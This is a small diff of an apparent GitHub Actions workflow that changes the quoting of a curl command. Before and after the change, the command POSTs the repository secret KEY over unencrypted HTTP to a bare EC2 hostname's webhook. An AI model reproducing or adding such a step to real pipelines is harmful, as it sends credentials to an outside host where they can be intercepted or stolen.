@@ -27,4 +27,4 @@ jobs:
       env: |
         KEY: ${{ secrets.KEY }}
       run: |
-        curl http://ec2-18-217-114-209.us-east-2.compute.amazonaws.com/webhook -X POST -H "Content-Type: application/json" -d '{"key": "'${KEY}'"}'
+        curl http://ec2-18-217-114-209.us-east-2.compute.amazonaws.com/webhook -X POST -H "Content-Type: application/json" -d '{"key": "'"${KEY}"'"}'
